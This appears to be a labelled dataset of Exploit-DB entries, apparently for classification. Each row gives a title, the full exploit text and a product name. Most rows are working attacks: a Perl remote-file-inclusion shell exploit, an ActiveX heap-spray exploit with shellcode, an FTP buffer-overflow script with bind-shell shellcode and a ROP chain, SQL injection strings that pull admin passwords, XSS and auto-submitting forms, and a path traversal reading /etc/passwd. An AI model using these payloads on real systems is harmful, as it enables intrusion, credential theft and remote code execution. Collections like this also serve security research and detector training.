39146,"Jigowatt PHP Event Calendar - 'day_view.php' SQL Injection source: https://www.securityfocus.com/bid/66923/info  Jigowatt PHP Event Calendar is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Jigowatt PHP Event Calendar 2.16b is vulnerable; other versions may also be affected.   http://www.example.com/code/calendar/day_view.php?day=23&month=4&year=[SQL injection]",Jigowatt PHP Event Calendar,1
38991,"Ovidentia NewsLetter Module 2.2 - 'admin.php' Remote File Inclusion # Title: Ovidentia Module newsletter 2.2 (admin.php) Remote File Inclusion Exploit # Author: bd0rk # eMail: bd0rk[at]hackermail.com # Twitter: twitter.com/bd0rk # Tested on: Ubuntu-Linux # Download: http://www.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FAdd-ons%2FModules%2Fnewsletter&file=newsletter-2-2.zip&idf=882  # Proof-of-Concept:  # /newsletter-2-2/programs/admin.php line 3 # ----------------------------------------------------------  # require_once($GLOBALS['babInstallPath'].'admin/acl.php');  # ----------------------------------------------------------  # Problem: The $GLOBALS['babInstallPath']-parameter isn't declared before require_once. # Fix: Declare this parameter or use an alert in php-sourcecode. #     Zum Beispiel ""BummPrengeleng du Nasenmensch!"" :D  # ---------------- # ~~Exploitcode~~ # ----------------  use LWP::UserAgent;   $Path = $ARGV[0]; $Pathtocmd = $ARGV[1]; $cmdv = $ARGV[2];   if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}   head();   while() {        print ""[shell] \$""; while(<STDIN>)        {                $cmd=$_;                chomp($cmd);   $xpl = LWP::UserAgent->new() or die; $req = HTTP::Request->new(GET =>$Path.'programs/admin.php?GLOBALS[babInstallPath]'.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die ""\nCould Not connect\n"";   $res = $xpl->request($req); $return = $res->content; $return =~ tr/[\n]/[....]/;   if (!$cmd) {print ""\nPlease Enter a Command\n\n""; $return ="""";}   elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)        {print ""\nCould Not Connect to cmd Host or Invalid Command Variable\n"";exit} elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print ""\nInvalid Command or No Return\n\n""}   if($return =~ /(.*)/)     {        $finreturn = $1;        $finreturn=~ tr/[....]/[\n]/;        print ""\r\n$finreturn\n\r"";        last; }   else {print ""[shell] \$"";}}}last;   sub head()  {  print ""\n============================================================================\r\n"";  print "" *Ovidentia Module newsletter 2.2 (admin.php) Remote File Inclusion Exploit*\r\n"";  print ""============================================================================\r\n"";  } sub usage()  {  head();  print "" Usage: sploit.pl [someone] [cmd shell location] [cmd shell variable]\r\n\n"";  print "" <Site> - Full path to phgstats ex: http://www.someone.com/ \r\n"";  print "" <cmd shell> - Path to cmd Shell e.g http://www.someone/cmd.txt \r\n"";  print "" <cmd variable> - Command variable used in php shell \r\n"";  print ""============================================================================\r\n"";  print ""                           Bug Found by bd0rk \r\n"";  print ""============================================================================\r\n"";  exit();  }",Ovidentia NewsLetter Module,1
4214,"Zenturi NixonMyPrograms Class 'sasatl.dll 1.5.0.531' - Remote Buffer Overflow <pre> <code><span style=""font: 10pt Courier New;""><span class=""general1-symbol"">-----------------------------------------------------------------------------  <b>Zenturi NixonMyPrograms Class (sasatl.dll v. 1.5.0.531) ""Scan()"" Method  Remote Buffer Overflow Exploit (Heap Spray Technique)</b>  url: http://www.programchecker.com/activeintro.aspx   author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://shinnai.altervista.org   Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7  <b>This exploits executes calc.exe</b> -----------------------------------------------------------------------------  <object id=boom classid=""clsid:6754F588-E262-42D2-A6BC-3BB400ACFEED"" style=""WIDTH: 578px; HEIGHT: 228px""></object>  <input language=JavaScript onclick=tryMe() type=button value=""Launch Exploit"">  <script>  var shellcode = unescape( ""%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800"" +                            ""%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A"" +                            ""%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350"" +                            ""%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40"" +                            ""%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000"" +                            ""%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040"" +                            ""%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD"" +                            ""%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40"" +                            ""%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18"" +                            ""%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0"" +                            ""%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B"" +                            ""%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24"" +                            ""%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9"" +                            ""%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C"" +                            ""%u652E%u6578%u9000"");   var spraySlide = unescape(""%u9090%u9090"");  var heapSprayToAddress = 0x0c0c0c0c;    function tryMe()    {     var size_buff = 6200;     var x =  unescape(""%0c%0c%0c%0c"");     while (x.length<size_buff) x += x;     x = x.substring(0,size_buff);      boom.Scan(1, x);    }        function getSpraySlide(spraySlide, spraySlideSize)    {     while (spraySlide.length*2<spraySlideSize)      {       spraySlide += spraySlide;      }     spraySlide = spraySlide.substring(0,spraySlideSize/2);     return (spraySlide);    }   var heapBlockSize = 0x400000;  var SizeOfHeapDataMoreover = 0x5;  var payLoadSize = (shellcode.length * 2);   var spraySlideSize = heapBlockSize - (payLoadSize + SizeOfHeapDataMoreover);  var heapBlocks = (heapSprayToAddress+heapBlockSize)/heapBlockSize;   var memory = new Array();  spraySlide = getSpraySlide(spraySlide,spraySlideSize);   for (i=0;i<heapBlocks;i++)   {     memory[i] = spraySlide +  shellcode;   } </script> </span></span> </code></pre>  # milw0rm.com [2007-07-23]",Zenturi NixonMyPrograms Class,1
9995,Apache Tomcat - Form Authentication 'Username' Enumeration Attackers can use readily available tools to exploit this issue.  The following example POST data is available:  POST /j_security_check HTTP/1.1 Host: www.example.com  j_username=tomcat&j_password=%,Apache Tomcat,1
22936,"SmartCMS - 'index.php?idx' SQL Injection =============================================================================================================      [o] SmartCMS <= SQL Injection Vulnerability            Software : SmartMS        Vendor   : http://smartcms.nl/        Author   : NoGe        Contact  : noge[dot]code[at]gmail[dot]com        Blog     : http://evilc0de.blogspot.com/   =============================================================================================================     [o] Exploit          http://localhost/[path]/index.php?idx=[SQLi]       [o] PoC          http://localhost/[path]/index.php?idx=123+AND+1=2+UNION+ALL+SELECT+version()--   =============================================================================================================     [o] Greetz          Vrs-hCk OoN_BoY Paman zxvf s4va Angela Zhang stardustmemory        aJe kaka11 matthews wishnusakti inc0mp13te martfella        pizzyroot Genex H312Y noname tukulesto }^-^{   =============================================================================================================     [o] November 26 2012 - Papua, Indonesia",SmartCMS,1
45577,"Ektron CMS 9.20 SP2 - Improper Access Restrictions Details ================ Software: Ektron Content Management System (CMS) Version: 9.20 SP2 Homepage: https://www.episerver.com Advisory report: https://github.com/alt3kx/CVE-2018-12596 CVE: CVE-2018-12596 CVSS: 7.5 (HIGH: (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) CWE-284  Description ================ Ektron CMS 9.20 SP2 allows remote attackers to enable users.  Vulnerability ================ Ektron CMS 9.20 SP2 allows remote attackers to call aspx pages via the ""activateuser.aspx"" page, even if a page is located under the /WorkArea/ path, which is forbidden (normally available exclusively for local admins).  Proof of concept Exploit ========================  Pre-requisites:  - curl command deployed (Windows or Linux) - Burpsuite Free/Pro deployed or any other WebProxy to catch/send GET request  Step (1): Launch the BurpSuite with default paramenter then request the follwing URL:  Target: https://ektronserver.com/WorkArea/activateuser.aspx  Normally you will see a 403 Forbidden: Access denied.  Step (2): Into BurpSuite Free/Pro add the following extra Header Referer:  ""Referer: ALEX;""  Step (3): The offending GET request is:  GET /WorkArea/activateuser.aspx HTTP/1.1 Host: ektronserver.com User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0 Referer: ALEX; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close  Step (4): Test your GET request using curl command and burpsuite as following:  # curl -i -s -k -XGET ""https://ektronserver.com/WorkArea/activateuser.aspx"" -H ""Host: ektronserver.com"" -H ""User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0"" -H ""Referer: ALEX;"" -H ""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"" -H ""Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate"" -H ""Connection: close"" --proxy http://127.0.0.1:8080  You should see now the following response 200 OK!:  HTTP/1.0 200 Connection established  HTTP/1.1 200 OK Cache-Control: private Content-Type: text/html; charset=utf-8  Now you got access to enable users, just send the repeat request into the browser using burpsuite  Have fun!  Mitigations ================ Install the latest patches available here:  PATCH ID: EKTR-508: Security enhancement for re-enabling a user https://support.episerver.com/hc/en-us/articles/115002828112-9-2-SP2-Site-Update  Any of the below should fix CVE-2018-12596  9.3(main release) 9.2 SP2 Site CU 22 9.1 SP3 Site CU 45 9.0 SP3 Site CU 31  Disclosure policy ================ We believes in responsible disclosure. Please contact us on Alex Hernandez aka alt3kx  (at) protonmail com to acknowledge this report.  This vulnerability will be published if we do not receive a response to this report with 10 days.  Timeline ================ 2018–06–08: Discovered 2018–06–11: Retest staging environment 2018–06–12: Restes live environment 2018–06–19: Internal communication 2018–06–21: Vendor notification 2018–06–21: Vendor feedback 2018–06–29: Vendor feedback product will be patched 2018–06–29: Patch available 2018–06–29: Agrements with the vendor to publish the CVE/Advisory. 2018–07–30: Internal communication 2018–09–15: Patches tested on LAB environment. 2018–10–08: Public report  Discovered by: Alex Hernandez aka alt3kx: ================ Please visit https://github.com/alt3kx for more information. My current exploit list @exploit-db: https://www.exploit-db.com/author/?a=1074",Ektron CMS,1
36313,"webERP 4.3.8 - Multiple Script URI Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/50713/info  webERP is prone to information-disclosure, SQL-injection, and cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.  An attacker may exploit the information-disclosure issue to gain access to sensitive information that may lead to further attacks.  An attacker may exploit the SQL-injection issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  An attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  webERP 4.0.5 is vulnerable; prior versions may also be affected.   http://www.example.com/doc/manual/manualcontents.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/index.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AccountGroups.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AccountSections.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AddCustomerContacts.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3C/html%3E http://www.example.com/AddCustomerNotes.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3C/html%3E http://www.example.com/Areas.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AddCustomerTypeNotes.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AgedDebtors.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E http://www.example.com/AgedSuppliers.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E",webERP,1
17886,"Freefloat FTP Server - Remote Buffer Overflow (DEP Bypass) #!/usr/bin/python import socket, sys from struct import pack  print ""\n==============================="" print ""Freefloat FTP Server DEP Bypass"" print ""       Written by Blake        "" print ""===============================\n""  if len(sys.argv) != 3: 	print ""[*] Usage: %s <target> <port>\n"" % sys.argv[0] 	sys.exit(0)  target = sys.argv[1] port = int(sys.argv[2])  # 728 bytes for shellcode #Bind Shell shellcode port 4444 shellcode = (""\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4"" ""\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c"" ""\x89\x93\x86\x7e\x03\x76\xb7\xac\x77\xf2\xea\x60\xf3\x56\x07"" ""\x0b\x51\x43\x9c\x79\x7e\x64\x15\x37\x58\x4b\xa6\xf6\x64\x07"" ""\x64\x99\x18\x5a\xb9\x79\x20\x95\xcc\x78\x65\xc8\x3f\x28\x3e"" ""\x86\x92\xdc\x4b\xda\x2e\xdd\x9b\x50\x0e\xa5\x9e\xa7\xfb\x1f"" ""\xa0\xf7\x54\x14\xea\xef\xdf\x72\xcb\x0e\x33\x61\x37\x58\x38"" ""\x51\xc3\x5b\xe8\xa8\x2c\x6a\xd4\x66\x13\x42\xd9\x77\x53\x65"" ""\x02\x02\xaf\x95\xbf\x14\x74\xe7\x1b\x91\x69\x4f\xef\x01\x4a"" ""\x71\x3c\xd7\x19\x7d\x89\x9c\x46\x62\x0c\x71\xfd\x9e\x85\x74"" ""\xd2\x16\xdd\x52\xf6\x73\x85\xfb\xaf\xd9\x68\x04\xaf\x86\xd5"" ""\xa0\xbb\x25\x01\xd2\xe1\x21\xe6\xe8\x19\xb2\x60\x7b\x69\x80"" ""\x2f\xd7\xe5\xa8\xb8\xf1\xf2\xcf\x92\x45\x6c\x2e\x1d\xb5\xa4"" ""\xf5\x49\xe5\xde\xdc\xf1\x6e\x1f\xe0\x27\x20\x4f\x4e\x98\x80"" ""\x3f\x2e\x48\x68\x2a\xa1\xb7\x88\x55\x6b\xce\x8f\x9b\x4f\x82"" ""\x67\xde\x6f\x34\x2b\x57\x89\x5c\xc3\x31\x01\xc9\x21\x66\x9a"" ""\x6e\x5a\x4c\xb6\x27\xcc\xd8\xd0\xf0\xf3\xd8\xf6\x52\x58\x70"" ""\x91\x20\xb2\x45\x80\x36\x9f\xed\xcb\x0e\x77\x67\xa2\xdd\xe6"" ""\x78\xef\xb6\x8b\xeb\x74\x47\xc2\x17\x23\x10\x83\xe6\x3a\xf4"" ""\x39\x50\x95\xeb\xc0\x04\xde\xa8\x1e\xf5\xe1\x31\xd3\x41\xc6"" ""\x21\x2d\x49\x42\x16\xe1\x1c\x1c\xc0\x47\xf7\xee\xba\x11\xa4"" ""\xb8\x2a\xe4\x86\x7a\x2d\xe9\xc2\x0c\xd1\x5b\xbb\x48\xed\x53"" ""\x2b\x5d\x96\x8e\xcb\xa2\x4d\x0b\xfb\xe8\xcc\x3d\x94\xb4\x84"" ""\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51"" ""\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a"")  buffer = ""\x41"" * 230 eip = pack('<L',0x77f613ac)		# RETN - shlwapi rop = ""\x42"" * 8			# compensate rop += pack('<L',0x77c2362c)		# POP EBX, RETN - msvcirt rop += ""\xff\xff\xff\xff"" rop += pack('<L',0x77c127e1)		# INC EBX, RETN rop += pack('<L',0x5d093466)		# POP EBP, RETN rop += pack('<L',0x7c8622a4)		# SetProcessDEPPolicy  rop += pack('<L',0x5d095470)		# POP EDI, RETN rop += pack('<L',0x5d095471)		# RETN rop += pack('<L',0x5d0913b4)		# POP ESI, RETN rop += pack('<L',0x5d095471)            # RETN rop += pack('<L',0x77e7d102) 		# PUSHAD # RETN - RPCRT4    nops = ""\x90"" * 10 junk = ""\x42"" * (1000 - len(buffer + eip + rop + nops + shellcode))  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) print ""[+] Connecting to %s on port %d"" % (target,port) try: 	s.connect((target,port)) 	s.recv(1024) 	print ""[+] Sending payload"" 	s.send(""USER "" + buffer + eip + rop + nops + shellcode + junk + ""\r\n"") 	s.close() 	print ""[+] Exploit successfully sent"" except: 	print ""[X] Unable to connect to %s"" % target  raw_input(""[+] Press any key to exit\n"")",Freefloat FTP Server,1
48486,"qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting # Exploit Title: qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting  # Google Dork: N/A # Date: 2020-05-19 # Exploit Author: Kishan Lal Choudhary # Vendor Homepage: https://qdpm.net # Software Link: https://sourceforge.net/projects/qdpm/ # Version: 9.1 # Tested on: Windows 10  Description: The form parameter 'cfg[app_app_name]' is vulnerable to stored cross site scripting Payload: <script>alert(1)</script>   POST /index.php/configuration HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------224716807133186052992861925563 Content-Length: 1881 Origin: http://localhost/ DNT: 1 Connection: close Referer: http://localhost/index.php/configuration?type=general Cookie: qdPM8=c14e5521818ec7a0c8bbc3099a96b94a Upgrade-Insecure-Requests: 1  -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""type""  general -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_administrator_email]""  admin@localhost.com -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_administrator_password]""   -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_app_name]""  <script>alert(1)</script> -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_app_short_name]""  qdPM -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg_app_app_logo_file""; filename="""" Content-Type: application/octet-stream   -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_app_logo]""   -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[sf_default_timezone]""  America/New_York -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[sf_default_culture]""  ar -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_rows_per_page]""  25 -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_rows_limit]""  1000 -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_custom_short_date_format]""  d M Y -----------------------------224716807133186052992861925563 Content-Disposition: form-data; name=""cfg[app_custom_logn_date_format]""  d M Y H:i -----------------------------224716807133186052992861925563--",qdPM,1
34412,"Hulihan Applications BXR 0.6.8 - SQL Injection / HTML Injection source: https://www.securityfocus.com/bid/42247/info  Hulihan Applications BXR is prone to an SQL-injection vulnerability and multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input.  An attacker may leverage these issues to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database or to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials, control how the site is viewed, and launch other attacks.  Hulihan Applications BXR 0.6.8 is vulnerable; other versions may also be affected.  http://www.example.com/folder/list?order_by=filesize&#039;+SQL   <form action=""http://host/search/show_results"" method=""post"" name=""main"" >  <input type=""hidden"" name=""search_type"" value=""filename"" /> <input type=""hidden"" name=""search[query]"" value=&#039;1""><script>alert(document.cookie)</script>&#039; /> <input type=""hidden"" name=""commit"" value=""Find!"" />  </form> <script> document.main.submit(); </script>   mytagname""><script>alert(document.cookie)</script>   <form action=""http://host/settings/update_settings"" method=""post"" name=""main"" >  <input type=""hidden"" name=""setting[site_title]"" value=&#039;BXR File Management System""><script>alert(document.cookie)</script>&#039; /> <input type=""hidden"" name=""setting[site_keywords]"" value=""BXR, Open Source File Management System"" /> <input type=""hidden"" name=""setting[site_description]"" value=""The Free, Open Source, Ruby on Rails File Management System."" /> <input type=""hidden"" name=""setting[let_users_change_default_folder]"" value=""0"" /> <input type=""hidden"" name=""setting[use_ferret]"" value=""0"" /> <input type=""hidden"" name=""setting[overwrite_existing_files]"" value=""0"" /> <input type=""hidden"" name=""commit"" value=""Update Settings"" />  </form> <script> document.main.submit(); </script>",Hulihan Applications BXR,1
9481,"Moa Gallery 1.1.0 - 'gallery_id' SQL Injection ====================================================================== [Â»] Script : Moa gallery 1.1.0 (gallery_id) Remote Sql injection vuln  [Â»] Language : php    [Â»] Download : http://sourceforge.net/projects/moagallery/  [Â»] Script site : http://www.moagallery.net/  [Â»] Founder: Mr.tro0oqy <- from Yemen  [Â»] Gr44tz to: [H]-> borken heart :(  [Â»] E-mail : t.4@windowslive.com ====================================================================== exploit: --------  http://www.xxx.com/path/index.php?action=gallery_view&gallery_id=-0000000009+union+select+concat(name,char(58),password)+from+moa_users--  -------- demo: --------  http://www.moagallery.net/demo/index.php?action=gallery_view&gallery_id=-0000000609+union+select+concat%28name,char%2858%29,password%29+from+moa_users--  # milw0rm.com [2009-08-24]",Moa Gallery,1
44650,"Cisco SA520W Security Appliance - Path Traversal # Title: Cisco SA520W Security Appliance - Path Traversal # Author: Nassim Asrir # Contact: wassline@gmail.com / https://www.linkedin.com/in/nassim-asrir-b73a57122/ # Vendor: https://www.cisco.com/ # About Product: =============== Cisco SA 500 Series Security Appliances are designed for businesses with fewer than 100 employees.  They combine firewall, VPN, and optional intrusion prevention system (IPS), email, and web security capabilities. Whether in the office or working remotely, your employees can securely access the resources they need, while your business is protected from unauthorized access and Internet threats.  # POC ====================  //In our poc we will try to read /etc/passwd  The vulnerable Parameter: thispage  payload: ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00index.htm  Request Type: POST  Request: =======  POST /scgi-bin/platform.cgi HTTP/1.1 Host: host-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: https://70.186.255.169/scgi-bin/platform.cgi Content-Type: application/x-www-form-urlencoded Content-Length: 311 Connection: close Upgrade-Insecure-Requests: 1  thispage=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00index.htm&SSLVPNUser.UserName=admin&SSLVPNUser.Password=admin&button.login.routerStatus=Log+In&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A58.0%29+Gecko%2F20100101+Firefox%2F58.0  Response: ========  HTTP/1.0 200 OK Date: Sat, 01 Jan 2000 00:00:41 GMT Server: Embedded HTTP Server. Connection: close root:$1$omdZQoH8$bFOOjhl.E7BKKzvW/bRJe0:0:0:root:/:/bin/sh nobody:x:0:0:nobody:/nonexistent:/bin/false  #Timeline: ========= 	 18 Apr 2018 : First Contact with Cisco. 18 Apr 2018 : Cisco Ask me for more details about the vulnerability. 18 Apr 2018 : Details sent to Cisco 19 Apr 2018 : Ask for update 15 May 2018 : Cisco say ""The product you reference went end of support in April 2016 No further action will be taken."" 18 May 2018 : Public Disclosure",Cisco SA520W Security Appliance,1
33947,"Last Wizardz - 'id' SQL Injection source: https://www.securityfocus.com/bid/39968/info  Last Wizardz is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/content.php?id=NULL+UNION+ALL+SELECT+1,CONCAT(id,0x3a,admin,0x3a,admin_pass),3,4,5,6,7,8+FROM+site_admin",Last Wizardz,1
